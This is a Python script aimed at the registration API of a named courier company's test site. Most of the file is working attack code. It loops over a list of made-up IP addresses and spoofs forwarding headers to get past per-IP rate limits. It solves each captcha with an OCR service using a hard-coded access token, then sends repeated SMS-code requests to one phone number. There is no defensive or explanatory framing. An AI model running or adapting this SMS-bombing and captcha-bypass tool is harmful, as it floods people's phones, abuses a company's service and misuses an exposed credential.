import json
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "https://uat-openapi.jtexpress.com.cn/"
iphone = "13888888888"

ip_list = [
    "143.139.46.149",
    "129.75.209.46",
    "140.248.68.66",
    "174.16.66.95",
    "159.98.118.56",
    "182.146.239.11",
    "162.61.225.38",
    "137.34.111.250",
    "168.49.59.137",
    "159.210.69.178",
    "158.63.147.108",
    "164.208.78.216",
    "186.192.18.33",
    "179.137.235.181",
    "130.128.75.210",
    "128.96.45.3",
    "169.137.206.146",
    "191.117.122.37",
    "129.27.193.22",
    "165.15.222.191",
    "130.254.135.71",
    "185.179.112.232",
    "153.35.93.218",
    "182.158.47.199",
    "173.129.84.61",
    "168.14.246.11",
    "148.101.142.45",
    "183.137.164.228",
    "179.170.180.174",
    "135.151.213.167",
    "183.218.147.148",
    "179.166.60.182",
    "188.190.149.38",
    "139.105.204.126",
    "140.29.68.117",
    "146.204.59.154",
    "166.39.225.141",
    "182.26.35.112",
    "166.84.158.216",
    "159.67.211.75",
    "178.47.135.10",
    "141.30.198.54",
    "132.163.253.186",
    "149.45.16.10",
    "189.38.92.78",
    "180.33.254.45",
    "148.159.207.134",
    "154.238.233.45",
    "180.155.75.7",
    "182.59.172.49",
    "152.50.113.222",
    "145.226.140.176",
    "170.48.86.120",
    "161.157.62.207",
    "182.246.111.179",
    "151.186.12.193",
    "146.42.149.189",
    "128.71.175.99",
    "177.88.146.34",
    "175.178.182.78",
    "141.230.11.152",
    "162.22.203.186",
    "158.9.243.25",
    "181.166.137.150",
    "157.96.235.38",
    "136.239.57.204",
    "166.164.157.229",
    "167.64.64.44",
    "161.78.65.186",
    "161.76.166.83",
    "169.72.191.39",
    "174.172.37.4",
    "187.93.113.74",
    "183.218.186.251",
    "159.50.152.12",
    "144.225.132.157",
    "156.119.35.54",
    "132.230.152.187",
    "167.252.16.174",
    "188.199.238.66",
    "188.137.154.125",
    "141.175.185.59",
    "144.53.144.254",
    "131.251.234.180",
    "145.62.44.15",
    "176.64.103.124",
    "184.172.239.217",
    "144.85.28.28",
    "146.19.98.211",
    "183.70.45.60",
    "138.151.113.110",
    "149.155.235.47",
    "155.62.119.55",
    "134.27.45.229",
    "131.186.173.58",
    "175.143.172.95",
    "184.125.28.214",
    "181.90.91.102",
    "157.39.208.112",
    "150.90.188.11",
]

for ip in ip_list:
    headers = {
        "Host": "uat-openapi.jtexpress.com.cn",
        "Connection": "close",
        "Content-Length": "89",
        "sec-ch-ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-mobile": "?0",
        "routeName": "Register",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "*/*",
        "Origin": "https://uat-open.jtexpress.com.cn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://uat-open.jtexpress.com.cn/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "dnt": "1",
        "sec-gpc": "1",
        "X-Forwarded-For": ip,
        "X-Real_IP": ip,
        "Client-ip": ip,
        "Remote_Addr": ip,
    }

    body = '''
        {}
        '''

    # 获取验证码token和base64
    # r = requests.post(url=target_url + "openplatformweb/captcha", data=body, headers=headers, timeout=20, verify=False)
    r = requests.get(url=target_url + "openplatformweb/captcha", timeout=5, verify=False)
    data = json.loads(r.text)
    # print(data)
    image_token = data['data']['ctoken']
    img = data['data']['img']

    # 获取图片对应的值
    request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic"

    params = {"image": img}
    access_token = '[24.3e998f3ea69f02ca81139414d8f7aa02.2592000.1686383914.282335-33426254]'
    request_url = request_url + "?access_token=" + access_token
    ocr_headers = {'content-type': 'application/x-www-form-urlencoded'}
    response = requests.post(request_url, data=params, headers=ocr_headers)
    image_value = ""
    if response:
        data = response.json()
        try:
            image_value = data['words_result'][0]['words']
        except:
            continue
    if not image_value.encode().isalnum() or len(image_value) != 4:
        continue
    # print(image_value)
    # 发送短信
    sms_body = '{"phone": "' + iphone + '","ctoken": "' + image_token + '","captcha": "' + image_value + '"}'
    try:
        r = requests.post(url=target_url + "openplatformweb/user/sendSms", data=sms_body, headers=headers,
                          timeout=5, verify=False)
    except:
        continue
    print(r.text)
